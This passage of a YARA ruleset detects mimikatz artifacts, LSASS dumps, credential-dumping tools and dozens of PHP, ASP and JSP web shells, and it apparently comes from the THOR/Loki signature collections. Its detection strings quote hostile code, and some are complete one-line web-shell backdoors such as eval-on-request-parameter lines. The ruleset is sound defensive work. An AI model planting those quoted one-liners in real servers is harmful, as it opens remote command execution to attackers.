		$sys_x64		= { 88 01 00 00 3c 04 00 00 40 00 00 00 [0-4] e8 02 00 00 f8 02 00 00 40 00 00 00 }

	condition:
		(all of ($exe_x86_*)) or (all of ($exe_x64_*)) or (all of ($dll_*)) or (any of ($sys_*))
}


rule mimikatz_lsass_mdmp
{
	meta:
		description		= "LSASS minidump file for mimikatz"
		author			= "Benjamin DELPY (gentilkiwi)"

	strings:
		$lsass			= "System32\\lsass.exe"	wide nocase

	condition:
		(uint32(0) == 0x504d444d) and $lsass
}


rule mimikatz_kirbi_ticket
{
	meta:
		description		= "KiRBi ticket for mimikatz"
		author			= "Benjamin DELPY (gentilkiwi)"

	strings:
		$asn1			= { 76 82 ?? ?? 30 82 ?? ?? a0 03 02 01 05 a1 03 02 01 16 }

	condition:
		$asn1 at 0
}


rule wce
{
	meta:
		description		= "wce"
		author			= "Benjamin DELPY (gentilkiwi)"
		tool_author		= "Hernan Ochoa (hernano)"

	strings:
		$hex_legacy		= { 8b ff 55 8b ec 6a 00 ff 75 0c ff 75 08 e8 [0-3] 5d c2 08 00 }
		$hex_x86		= { 8d 45 f0 50 8d 45 f8 50 8d 45 e8 50 6a 00 8d 45 fc 50 [0-8] 50 72 69 6d 61 72 79 00 }
		$hex_x64		= { ff f3 48 83 ec 30 48 8b d9 48 8d 15 [0-16] 50 72 69 6d 61 72 79 00 }

	condition:
		any of them
}


rule lsadump
{
	meta:
		description		= "LSA dump programe (bootkey/syskey) - pwdump and others"
		author			= "Benjamin DELPY (gentilkiwi)"

	strings:
		$str_sam_inc	= "\\Domains\\Account" ascii nocase
		$str_sam_exc	= "\\Domains\\Account\\Users\\Names\\" ascii nocase
		$hex_api_call	= {(41 b8 | 68) 00 00 00 02 [0-64] (68 | ba) ff 07 0f 00 }
		$str_msv_lsa	= { 4c 53 41 53 52 56 2e 44 4c 4c 00 [0-32] 6d 73 76 31 5f 30 2e 64 6c 6c 00 }
		$hex_bkey		= { 4b 53 53 4d [20-70] 05 00 01 00}

	condition:
		( ($str_sam_inc and not $str_sam_exc) or $hex_api_call or $str_msv_lsa or $hex_bkey )
      and not uint16(0) == 0x5a4d
}

rule Mimikatz_Logfile
{
	meta:
		description = "Detects a log file generated by malicious hack tool mimikatz"
		author = "Florian Roth"
		score = 80
		date = "2015/03/31"
		reference = "https://github.com/Neo23x0/Loki/blob/master/signatures/thor-hacktools.yar"
	strings:
		$s1 = "SID               :" ascii fullword
		$s2 = "* NTLM     :" ascii fullword
		$s3 = "Authentication Id :" ascii fullword
		$s4 = "wdigest :" ascii fullword
	condition:
		all of them
}

rule AppInitHook {
	meta:
		description = "AppInitGlobalHooks-Mimikatz - Hide Mimikatz From Process Lists - file AppInitHook.dll"
		author = "Florian Roth"
		reference = "https://goo.gl/Z292v6"
		date = "2015-07-15"
		score = 70
		hash = "e7563e4f2a7e5f04a3486db4cefffba173349911a3c6abd7ae616d3bf08cfd45"
	strings:
		$s0 = "\\Release\\AppInitHook.pdb" ascii
		$s1 = "AppInitHook.dll" fullword ascii
		$s2 = "mimikatz.exe" fullword wide
		$s3 = "]X86Instruction->OperandSize >= Operand->Length" fullword wide
		$s4 = "mhook\\disasm-lib\\disasm.c" fullword wide
		$s5 = "mhook\\disasm-lib\\disasm_x86.c" fullword wide
		$s6 = "VoidFunc" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and 4 of them
}

rule VSSown_VBS {
	meta:
		description = "Detects VSSown.vbs script - used to export shadow copy elements like NTDS to take away and crack elsewhere"
		author = "Florian Roth"
		date = "2015-10-01"
		score = 75
	strings:
		$s0 = "Select * from Win32_Service Where Name ='VSS'" ascii
		$s1 = "Select * From Win32_ShadowCopy" ascii
		$s2 = "cmd /C mklink /D " ascii
		$s3 = "ClientAccessible" ascii
		$s4 = "WScript.Shell" ascii
		$s5 = "Win32_Process" ascii
	condition:
		all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

/*

   THOR APT Scanner - Web Shells Extract
   This rulset is a subset of all hack tool rules included in our
   APT Scanner THOR - the full featured APT scanner

   We will frequently update this file with new rules rated TLP:WHITE

   Florian Roth
   BSK Consulting GmbH
   Web: bsk-consulting.de

   revision: 20150122

*/

rule Weevely_Webshell {
	meta:
		description = "Weevely Webshell - Generic Rule - heavily scrambled tiny web shell"
		author = "Florian Roth"
		reference = "http://www.ehacking.net/2014/12/weevely-php-stealth-web-backdoor-kali.html"
		date = "2014/12/14"
		score = 60
	strings:
		$php = "<?php" ascii
		$s0 = /\$[a-z]{4} = \$[a-z]{4}\("[a-z][a-z]?",[\s]?"",[\s]?"/ ascii
		$s1 = /\$[a-z]{4} = str_replace\("[a-z][a-z]?","","/ ascii
		$s2 = /\$[a-z]{4}\.\$[a-z]{4}\.\$[a-z]{4}\.\$[a-z]{4}\)\)\); \$[a-z]{4}\(\);/ ascii
		$s4 = /\$[a-z]{4}="[a-zA-Z0-9]{70}/ ascii
	condition:
		$php at 0 and all of ($s*) and filesize > 570 and filesize < 800
}

rule webshell_h4ntu_shell_powered_by_tsoi_ {
	meta:
		description = "Web Shell - file h4ntu shell [powered by tsoi].php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "06ed0b2398f8096f1bebf092d0526137"
	strings:
		$s0 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>Server Adress:</b"
		$s3 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>User Info:</b> ui"
		$s4 = "    <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><?= $info ?>: <?= "
		$s5 = "<INPUT TYPE=\"text\" NAME=\"cmd\" value=\"<?php echo stripslashes(htmlentities($"
	condition:
		all of them
}
rule webshell_PHP_sql {
	meta:
		description = "Web Shell - file sql.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "2cf20a207695bbc2311a998d1d795c35"
	strings:
		$s0 = "$result=mysql_list_tables($db) or die (\"$h_error<b>\".mysql_error().\"</b>$f_"
		$s4 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"
	condition:
		all of them
}
rule webshell_PHP_a {
	meta:
		description = "Web Shell - file a.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "e3b461f7464d81f5022419d87315a90d"
	strings:
		$s1 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\""
		$s2 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>"
		$s4 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p> " fullword
	condition:
		2 of them
}
rule webshell_iMHaPFtp_2 {
	meta:
		description = "Web Shell - file iMHaPFtp.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "12911b73bc6a5d313b494102abcf5c57"
	strings:
		$s8 = "if ($l) echo '<a href=\"' . $self . '?action=permission&amp;file=' . urlencode($"
		$s9 = "return base64_decode('R0lGODlhEQANAJEDAMwAAP///5mZmf///yH5BAHoAwMALAAAAAARAA0AAA"
	condition:
		1 of them
}
rule webshell_Jspspyweb {
	meta:
		description = "Web Shell - file Jspspyweb.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "4e9be07e95fff820a9299f3fb4ace059"
	strings:
		$s0 = "      out.print(\"<tr><td width='60%'>\"+strCut(convertPath(list[i].getPath()),7"
		$s3 = "  \"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control"
	condition:
		all of them
}
rule webshell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2 {
	meta:
		description = "Web Shell - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "49ad9117c96419c35987aaa7e2230f63"
	strings:
		$s0 = "die(\"\\nWelcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\\n"
		$s1 = "Mode Shell v1.0</font></span></a></font><font face=\"Webdings\" size=\"6\" color"
	condition:
		1 of them
}
rule webshell_SimAttacker_Vrsion_1_0_0_priv8_4_My_friend {
	meta:
		description = "Web Shell - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "089ff24d978aeff2b4b2869f0c7d38a3"
	strings:
		$s2 = "echo \"<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><fo"
		$s3 = "fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"
	condition:
		1 of them
}
rule webshell_phpshell_2_1_pwhash {
	meta:
		description = "Web Shell - file pwhash.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "ba120abac165a5a30044428fac1970d8"
	strings:
		$s1 = "<tt>&nbsp;</tt>\" (space), \"<tt>[</tt>\" (left bracket), \"<tt>|</tt>\" (pi"
		$s3 = "word: \"<tt>null</tt>\", \"<tt>yes</tt>\", \"<tt>no</tt>\", \"<tt>true</tt>\","
	condition:
		1 of them
}
rule webshell_PHPRemoteView {
	meta:
		description = "Web Shell - file PHPRemoteView.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "29420106d9a81553ef0d1ca72b9934d9"
	strings:
		$s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
		$s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u"
	condition:
		1 of them
}
rule webshell_jsp_12302 {
	meta:
		description = "Web Shell - file 12302.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "a3930518ea57d899457a62f372205f7f"
	strings:
		$s0 = "</font><%out.print(request.getRealPath(request.getServletPath())); %>" fullword
		$s1 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>" fullword
		$s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
	condition:
		all of them
}
rule webshell_caidao_shell_guo {
	meta:
		description = "Web Shell - file guo.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "9e69a8f499c660ee0b4796af14dc08f0"
	strings:
		$s0 = "<?php ($www= $_POST['ice'])!"
		$s1 = "@preg_replace('/ad/e','@'.str_rot13('riny').'($ww"
	condition:
		1 of them
}
rule webshell_PHP_redcod {
	meta:
		description = "Web Shell - file redcod.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "5c1c8120d82f46ff9d813fbe3354bac5"
	strings:
		$s0 = "H8p0bGFOEy7eAly4h4E4o88LTSVHoAglJ2KLQhUw" fullword
		$s1 = "HKP7dVyCf8cgnWFy8ocjrP5ffzkn9ODroM0/raHm" fullword
	condition:
		all of them
}
rule webshell_remview_fix {
	meta:
		description = "Web Shell - file remview_fix.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "a24b7c492f5f00e2a19b0fa2eb9c3697"
	strings:
		$s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u"
		$s5 = "echo \"<P><hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n"
	condition:
		1 of them
}
rule webshell_asp_cmd {
	meta:
		description = "Web Shell - file cmd.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "895ca846858c315a3ff8daa7c55b3119"
	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
		$s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
		$s3 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
	condition:
		1 of them
}
rule webshell_php_sh_server {
	meta:
		description = "Web Shell - file server.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 50
		hash = "d87b019e74064aa90e2bb143e5e16cfa"
	strings:
		$s0 = "eval(getenv('HTTP_CODE'));" fullword
	condition:
		all of them
}
rule webshell_PH_Vayv_PH_Vayv {
	meta:
		description = "Web Shell - file PH Vayv.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "35fb37f3c806718545d97c6559abd262"
	strings:
		$s0 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px in"
		$s4 = "<font color=\"#858585\">SHOPEN</font></a></font><font face=\"Verdana\" style"
	condition:
		1 of them
}
rule webshell_caidao_shell_ice {
	meta:
		description = "Web Shell - file ice.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "6560b436d3d3bb75e2ef3f032151d139"
	strings:
		$s0 = "<%eval request(\"ice\")%>" fullword
	condition:
		all of them
}
rule webshell_cihshell_fix {
	meta:
		description = "Web Shell - file cihshell_fix.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "3823ac218032549b86ee7c26f10c4cb5"
	strings:
		$s7 = "<tr style='background:#242424;' ><td style='padding:10px;'><form action='' encty"
		$s8 = "if (isset($_POST['mysqlw_host'])){$dbhost = $_POST['mysqlw_host'];} else {$dbhos"
	condition:
		1 of them
}
rule webshell_asp_shell {
	meta:
		description = "Web Shell - file shell.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "e63f5a96570e1faf4c7b8ca6df750237"
	strings:
		$s7 = "<input type=\"submit\" name=\"Send\" value=\"GO!\">" fullword
		$s8 = "<TEXTAREA NAME=\"1988\" ROWS=\"18\" COLS=\"78\"></TEXTAREA>" fullword
	condition:
		all of them
}
rule webshell_Private_i3lue {
	meta:
		description = "Web Shell - file Private-i3lue.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "13f5c7a035ecce5f9f380967cf9d4e92"
	strings:
		$s8 = "case 15: $image .= \"\\21\\0\\"
	condition:
		all of them
}
rule webshell_php_up {
	meta:
		description = "Web Shell - file up.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "7edefb8bd0876c41906f4b39b52cd0ef"
	strings:
		$s0 = "copy($HTTP_POST_FILES['userfile']['tmp_name'], $_POST['remotefile']);" fullword
		$s3 = "if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name'])) {" fullword
		$s8 = "echo \"Uploaded file: \" . $HTTP_POST_FILES['userfile']['name'];" fullword
	condition:
		2 of them
}
rule webshell_Mysql_interface_v1_0 {
	meta:
		description = "Web Shell - file Mysql interface v1.0.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "a12fc0a3d31e2f89727b9678148cd487"
	strings:
		$s0 = "echo \"<td><a href='$PHP_SELF?action=dropDB&dbname=$dbname' onClick=\\\"return"
	condition:
		all of them
}
rule webshell_php_s_u {
	meta:
		description = "Web Shell - file s-u.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "efc7ba1a4023bcf40f5e912f1dd85b5a"
	strings:
		$s6 = "<a href=\"?act=do\"><font color=\"red\">Go Execute</font></a></b><br /><textarea"
	condition:
		all of them
}
rule webshell_phpshell_2_1_config {
	meta:
		description = "Web Shell - file config.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "bd83144a649c5cc21ac41b505a36a8f3"
	strings:
		$s1 = "; (choose good passwords!).  Add uses as simple 'username = \"password\"' lines." fullword
	condition:
		all of them
}
rule webshell_asp_EFSO_2 {
	meta:
		description = "Web Shell - file EFSO_2.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "a341270f9ebd01320a7490c12cb2e64c"
	strings:
		$s0 = "%8@#@&P~,P,PP,MV~4BP^~,NS~m~PXc3,_PWbSPU W~~[u3Fffs~/%@#@&~~,PP~~,M!PmS,4S,mBPNB"
	condition:
		all of them
}
rule webshell_jsp_up {
	meta:
		description = "Web Shell - file up.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "515a5dd86fe48f673b72422cccf5a585"
	strings:
		$s9 = "// BUG: Corta el fichero si es mayor de 640Ks" fullword
	condition:
		all of them
}
rule webshell_NetworkFileManagerPHP {
	meta:
		description = "Web Shell - file NetworkFileManagerPHP.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "acdbba993a5a4186fd864c5e4ea0ba4f"
	strings:
		$s9 = "  echo \"<br><center>All the data in these tables:<br> \".$tblsv.\" were putted "
	condition:
		all of them
}
rule webshell_Server_Variables {
	meta:
		description = "Web Shell - file Server Variables.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "47fb8a647e441488b30f92b4d39003d7"
	strings:
		$s7 = "<% For Each Vars In Request.ServerVariables %>" fullword
		$s9 = "Variable Name</B></font></p>" fullword
	condition:
		all of them
}
rule webshell_caidao_shell_ice_2 {
	meta:
		description = "Web Shell - file ice.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "1d6335247f58e0a5b03e17977888f5f2"
	strings:
		$s0 = "<?php ${${eval($_POST[ice])}};?>" fullword
	condition:
		all of them
}
rule webshell_caidao_shell_mdb {
	meta:
		description = "Web Shell - file mdb.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "fbf3847acef4844f3a0d04230f6b9ff9"
	strings:
		$s1 = "<% execute request(\"ice\")%>a " fullword
	condition:
		all of them
}
rule webshell_jsp_guige {
	meta:
		description = "Web Shell - file guige.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "2c9f2dafa06332957127e2c713aacdd2"
	strings:
		$s0 = "if(damapath!=null &&!damapath.equals(\"\")&&content!=null"
	condition:
		all of them
}
rule webshell_phpspy2010 {
	meta:
		description = "Web Shell - file phpspy2010.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "14ae0e4f5349924a5047fed9f3b105c5"
	strings:
		$s3 = "eval(gzinflate(base64_decode("
		$s5 = "//angel" fullword
		$s8 = "$admin['cookiedomain'] = '';" fullword
	condition:
		all of them
}
rule webshell_asp_ice {
	meta:
		description = "Web Shell - file ice.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "d141e011a92f48da72728c35f1934a2b"
	strings:
		$s0 = "D,'PrjknD,J~[,EdnMP[,-4;DS6@#@&VKobx2ldd,'~JhC"
	condition:
		all of them
}
rule webshell_drag_system {
	meta:
		description = "Web Shell - file system.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "15ae237cf395fb24cf12bff141fb3f7c"
	strings:
		$s9 = "String sql = \"SELECT * FROM DBA_TABLES WHERE TABLE_NAME not like '%$%' and num_"
	condition:
		all of them
}
rule webshell_DarkBlade1_3_asp_indexx {
	meta:
		description = "Web Shell - file indexx.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "b7f46693648f534c2ca78e3f21685707"
	strings:
		$s3 = "Const strs_toTransform=\"command|Radmin|NTAuThenabled|FilterIp|IISSample|PageCou"
	condition:
		all of them
}
rule webshell_phpshell3 {
	meta:
		description = "Web Shell - file phpshell3.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "76117b2ee4a7ac06832d50b2d04070b8"
	strings:
		$s2 = "<input name=\"nounce\" type=\"hidden\" value=\"<?php echo $_SESSION['nounce'];"
		$s5 = "<p>Username: <input name=\"username\" type=\"text\" value=\"<?php echo $userna"
		$s7 = "$_SESSION['output'] .= \"cd: could not change to: $new_dir\\n\";" fullword
	condition:
		2 of them
}
rule webshell_jsp_hsxa {
	meta:
		description = "Web Shell - file hsxa.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "d0e05f9c9b8e0b3fa11f57d9ab800380"
	strings:
		$s0 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja"
	condition:
		all of them
}
rule webshell_jsp_utils {
	meta:
		description = "Web Shell - file utils.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "9827ba2e8329075358b8e8a53e20d545"
	strings:
		$s0 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword
		$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
	condition:
		all of them
}
rule webshell_asp_01 {
	meta:
		description = "Web Shell - file 01.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 50
		hash = "61a687b0bea0ef97224c7bd2df118b87"
	strings:
		$s0 = "<%eval request(\"pass\")%>" fullword
	condition:
		all of them
}
rule webshell_asp_404 {
	meta:
		description = "Web Shell - file 404.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "d9fa1e8513dbf59fa5d130f389032a2d"
	strings:
		$s0 = "lFyw6pd^DKV^4CDRWmmnO1GVKDl:y& f+2"
	condition:
		all of them
}
rule webshell_webshell_cnseay02_1 {
	meta:
		description = "Web Shell - file webshell-cnseay02-1.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "95fc76081a42c4f26912826cb1bd24b1"
	strings:
		$s0 = "(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU"
	condition:
		all of them
}
rule webshell_php_fbi {
	meta:
		description = "Web Shell - file fbi.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "1fb32f8e58c8deb168c06297a04a21f1"
	strings:
		$s7 = "erde types','Getallen','Datum en tijd','Tekst','Binaire gegevens','Netwerk','Geo"
	condition:
		all of them
}
rule webshell_B374kPHP_B374k {
	meta:
		description = "Web Shell - file B374k.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "bed7388976f8f1d90422e8795dff1ea6"
	strings:
		$s0 = "Http://code.google.com/p/b374k-shell" fullword
		$s1 = "$_=str_rot13('tm'.'vas'.'yngr');$_=str_rot13(strrev('rqb'.'prq'.'_'.'46r'.'fno'"
		$s3 = "Jayalah Indonesiaku & Lyke @ 2013" fullword
		$s4 = "B374k Vip In Beautify Just For Self" fullword
	condition:
		1 of them
}
rule webshell_cmd_asp_5_1 {
	meta:
		description = "Web Shell - file cmd-asp-5.1.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "8baa99666bf3734cbdfdd10088e0cd9f"
	strings:
		$s9 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword
	condition:
		all of them
}
rule webshell_php_dodo_zip {
	meta:
		description = "Web Shell - file zip.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "b7800364374077ce8864796240162ad5"
	strings:
		$s0 = "$hexdtime = '\\x' . $dtime[6] . $dtime[7] . '\\x' . $dtime[4] . $dtime[5] . '\\x"
		$s3 = "$datastr = \"\\x50\\x4b\\x03\\x04\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
	condition:
		all of them
}
rule webshell_aZRaiLPhp_v1_0 {
	meta:
		description = "Web Shell - file aZRaiLPhp v1.0.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "26b2d3943395682e36da06ed493a3715"
	strings:
		$s5 = "echo \" <font color='#0000FF'>CHMODU \".substr(base_convert(@fileperms($"
		$s7 = "echo \"<a href='./$this_file?op=efp&fname=$path/$file&dismi=$file&yol=$path'><fo"
	condition:
		all of them
}
rule webshell_php_list {
	meta:
		description = "Web Shell - file list.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "922b128ddd90e1dc2f73088956c548ed"
	strings:
		$s1 = "// list.php = Directory & File Listing" fullword
		$s2 = "    echo \"( ) <a href=?file=\" . $fichero . \"/\" . $filename . \">\" . $filena"
		$s9 = "// by: The Dark Raver" fullword
	condition:
		1 of them
}
rule webshell_ironshell {
	meta:
		description = "Web Shell - file ironshell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "8bfa2eeb8a3ff6afc619258e39fded56"
	strings:
		$s4 = "print \"<form action=\\\"\".$me.\"?p=cmd&dir=\".realpath('.').\""
		$s8 = "print \"<td id=f><a href=\\\"?p=rename&file=\".realpath($file).\"&di"
	condition:
		all of them
}
rule webshell_caidao_shell_404 {
	meta:
		description = "Web Shell - file 404.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "ee94952dc53d9a29bdf4ece54c7a7aa7"
	strings:
		$s0 = "<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('St"
	condition:
		all of them
}
rule webshell_ASP_aspydrv {
	meta:
		description = "Web Shell - file aspydrv.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "de0a58f7d1e200d0b2c801a94ebce330"
	strings:
		$s3 = "<%=thingy.DriveLetter%> </td><td><tt> <%=thingy.DriveType%> </td><td><tt> <%=thi"
	condition:
		all of them
}
rule webshell_jsp_web {
	meta:
		description = "Web Shell - file web.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "4bc11e28f5dccd0c45a37f2b541b2e98"
	strings:
		$s0 = "<%@page import=\"java.io.*\"%><%@page import=\"java.net.*\"%><%String t=request."
	condition:
		all of them
}
rule webshell_mysqlwebsh {
	meta:
		description = "Web Shell - file mysqlwebsh.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "babfa76d11943a22484b3837f105fada"
	strings:
		$s3 = " <TR><TD bgcolor=\"<? echo (!$CONNECT && $action == \"chparam\")?\"#660000\":\"#"
	condition:
		all of them
}
rule webshell_jspShell {
	meta:
		description = "Web Shell - file jspShell.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "0d5b5a17552254be6c1c8f1eb3a5fdc1"
	strings:
		$s0 = "<input type=\"checkbox\" name=\"autoUpdate\" value=\"AutoUpdate\" on"
		$s1 = "onblur=\"document.shell.autoUpdate.checked= this.oldValue;"
	condition:
		all of them
}
rule webshell_Dx_Dx {
	meta:
		description = "Web Shell - file Dx.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "9cfe372d49fe8bf2fac8e1c534153d9b"
	strings:
		$s1 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s9 = "class=linelisting><nobr>POST (php eval)</td><"
	condition:
		1 of them
}
rule webshell_asp_ntdaddy {
	meta:
		description = "Web Shell - file ntdaddy.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "c5e6baa5d140f73b4e16a6cfde671c68"
	strings:
		$s9 =  "if  FP  =  \"RefreshFolder\"  or  "
		$s10 = "request.form(\"cmdOption\")=\"DeleteFolder\"  "
	condition:
		1 of them
}
rule webshell_MySQL_Web_Interface_Version_0_8 {
	meta:
		description = "Web Shell - file MySQL Web Interface Version 0.8.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "36d4f34d0a22080f47bb1cb94107c60f"
	strings:
		$s2 = "href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>"
	condition:
		all of them
}
rule webshell_elmaliseker_2 {
	meta:
		description = "Web Shell - file elmaliseker.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "b32d1730d23a660fd6aa8e60c3dc549f"
	strings:
		$s1 = "<td<%if (FSO.GetExtensionName(path & \"\\\" & oFile.Name)=\"lnk\") or (FSO.GetEx"
		$s6 = "<input type=button value=Save onclick=\"EditorCommand('Save')\"> <input type=but"
	condition:
		all of them
}
rule webshell_ASP_RemExp {
	meta:
		description = "Web Shell - file RemExp.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "aa1d8491f4e2894dbdb91eec1abc2244"
	strings:
		$s0 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Reques"
		$s1 = "Private Function ConvertBinary(ByVal SourceNumber, ByVal MaxValuePerIndex, ByVal"
	condition:
		all of them
}
rule webshell_jsp_list1 {
	meta:
		description = "Web Shell - file list1.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "8d9e5afa77303c9c01ff34ea4e7f6ca6"
	strings:
		$s1 = "case 's':ConnectionDBM(out,encodeChange(request.getParameter(\"drive"
		$s9 = "return \"<a href=\\\"javascript:delFile('\"+folderReplace(file)+\"')\\\""
	condition:
		all of them
}
rule webshell_phpkit_1_0_odd {
	meta:
		description = "Web Shell - file odd.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "594d1b1311bbef38a0eb3d6cbb1ab538"
	strings:
		$s0 = "include('php://input');" fullword
		$s1 = "// No eval() calls, no system() calls, nothing normally seen as malicious." fullword
		$s2 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
	condition:
		all of them
}
rule webshell_jsp_123 {
	meta:
		description = "Web Shell - file 123.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "c691f53e849676cac68a38d692467641"
	strings:
		$s0 = "<font color=\"blue\">??????????????????:</font><input type=\"text\" size=\"7"
		$s3 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
		$s9 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">    " fullword
	condition:
		all of them
}
rule webshell_asp_1 {
	meta:
		description = "Web Shell - file 1.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "8991148adf5de3b8322ec5d78cb01bdb"
	strings:
		$s4 = "!22222222222222222222222222222222222222222222222222" fullword
		$s8 = "<%eval request(\"pass\")%>" fullword
	condition:
		all of them
}
